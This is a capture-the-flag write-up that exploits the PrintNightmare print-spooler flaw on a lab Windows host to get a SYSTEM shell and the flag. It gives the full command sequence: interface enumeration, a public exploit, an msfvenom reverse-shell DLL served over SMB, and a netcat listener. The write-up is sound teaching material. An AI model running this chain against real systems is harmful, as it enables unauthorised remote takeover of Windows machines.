

![](Pasted%20image%2020210809231954.png)

If you don't live under a rock and follow cyber security news even slightly, you'd be aware that a new RCE vulnerability for Windows Printer Spool service was released recently. The vulnerability dubbed PrintNightmare has released a lot of attention and for the right reasons... Its pretty epic!

The name of the challenge hints at it being about this vulnerability and the note gives it away (especially if you solved the previous challenge using PrintNightmare ;) ):
> Note 2: this vulnerability was also present in the Scorching challenge (which has been patched as of phase 3).

We're given credentials to begin with `Space:Inv4d3r` which means most of the work is already done for us. Now we only need to run the exploit.

We can check if MS-PAR and MS-RPRN system calls are exposed. Either of these may be used to exploit this vulnerability:
```
% rpcdump.py "Space:Inv4d3r@10.6.0.2" | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

We can see that both are available so this host is potentially vulnerable.

There are a lot of exploits available on github, however I've found that this guy's exploit is one of the more reliable: https://github.com/cube0x0/CVE-2021-1675

You need to install his impacket implementation in order to run this exploit. However, if you're like me and don't want to mess up your impacket installation, you can simply run everything in a virtual environment so that you don't overwrite your impacket install.

We setup a virtual environment using `pipenv` and install the custom impacket code:
```
% pipenv shell
% git clone https://github.com/cube0x0/impacket
% cd impacket
% pip install .

# if you're having issues with pip hanging, try running pip with -v and if its related to HTTPS, disabled ipv6 (ref: https://stackoverflow.com/a/64605497)
```

Clone the actual exploit now:
```
git clone https://github.com/cube0x0/CVE-2021-1675
```

You should now have the python exploit:
```
% ls
CVE-2021-1675.py  Images  README.md  SharpPrintNightmare
```

Create a directory which will be your exposed share, in this case I've called it "myshare":
```
% mkdir myshare
```

Create a reverse shell dll using msfvenom and put it in your "myshare" directory. My IP is 10.6.0.100 and I'll be listening on port 80:
```
(asdf-I4AHjtDI) (main) % msfvenom  -f dll -p windows/x64/shell_reverse_tcp LHOST=10.6.0.100 LPORT=80 -o reverse.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
Saved as: reverse.dll
(asdf-I4AHjtDI) (main)⚡ % mv reverse.dll myshare   
```

At this point, we can start the smbserver in a separate terminal window and server the "myshare" folder as a share named "myshare":
```
% sudo smbserver.py myshare myshare
[sudo] password for lo:
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

In another window, we start our netcat listener:
```
% sudo nc -lvnp 80                                                                  [sudo] password for lo:
listening on [any] 80 ...

```

And finally, in the virtual environment we can run the exploit:
```
% python3 CVE-2021-1675.py Space:Inv4d3r@10.6.0.2 '\\10.6.0.100\myshare\reverse.dll'        
[*] Connecting to ncacn_np:10.6.0.2[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_3138b2c823dd1ea9\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.6.0.100\myshare\reverse.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

```

It might take a few tries for the exploit to work, however it should trigger and you get a reverse shell back.

In the end, your setup might look similar to this:
![](Pasted%20image%2020210809235643.png)

And you have a shell as system:
```
% sudo nc -lvnp 80
[sudo] password for lo:
listening on [any] 80 ...
connect to [10.6.0.100] from (UNKNOWN) [10.6.0.2] 52907
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
DC1

```

The flag is locate in `C:\`:
```
C:\>cd /
cd /

C:\>ls
ls
$Recycle.Bin
BOOTNXT
Documents and Settings
PerfLogs
Program Files
Program Files (x86)
ProgramData
System Volume Information
TheFlag.txt
Users
Windows
bootmgr
pagefile.sys

C:\>type TheFlag.txt
type TheFlag.txt
CTF{55a7160186a60b662b37c9c07c709e18}
```